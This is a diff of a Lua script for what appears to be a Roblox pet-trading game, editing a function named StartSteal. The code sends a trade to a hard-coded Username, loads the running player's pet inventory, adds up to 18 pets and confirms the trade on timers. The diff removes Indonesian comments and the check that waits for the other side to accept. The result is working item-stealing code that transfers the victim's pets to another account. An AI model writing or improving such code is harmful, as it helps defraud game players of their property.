@@ -283,53 +283,32 @@ local function StartSteal()
     local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
     local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
 
-    -- Kirim permintaan perdagangan
     SendTrade:FireServer(game.Players[Username])
-    wait(10)  -- Tunggu beberapa detik untuk memastikan tawaran diterima
-
-    -- Ambil inventory pets
-    local PetsInventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
+    wait(8)
+    local PetsInventory =
+        require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
     if PetsInventory.pets then
         local petCount = 0
         local petUids = {}
-
-        -- Kumpulkan semua UID hewan peliharaan
         for petUid, petData in pairs(PetsInventory.pets) do
             table.insert(petUids, petUid)
         end
 
-        -- Tambahkan hewan peliharaan ke tawaran
         while #petUids > 0 do
             local petUid = table.remove(petUids, 1)
             AddPetRemote:FireServer(petUid)
             petCount = petCount + 1
             if petCount >= 18 then
-                break  -- Batasi hingga 18 hewan peliharaan
+                break
             end
-            wait(1)  -- Tunggu sejenak sebelum menambahkan hewan peliharaan berikutnya
         end
     else
         print("No pets found in inventory.")
-        return  -- Keluar jika tidak ada hewan peliharaan
     end
-
-    -- Tunggu hingga tawaran diterima oleh pemain lain
-    local tradeAccepted = false
-    local function onTradeAccepted()
-        tradeAccepted = true
-    end
-
-    -- Daftarkan event untuk mendeteksi ketika tawaran diterima
-    RouterClient.get("TradeAPI/TradeAccepted").OnClientEvent:Connect(onTradeAccepted)
-
-    -- Tunggu hingga tawaran diterima
-    while not tradeAccepted do
-        wait(1)  -- Tunggu sejenak sebelum memeriksa lagi
-    end
-
-    -- Terima tawaran
+    wait(6)
     AcceptNegotiationRemote:FireServer()
-    wait(5)  -- Tunggu sebelum mengonfirmasi perdagangan
+    wait(5)
+    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
     ConfirmTradeRemote:FireServer()
 end
 
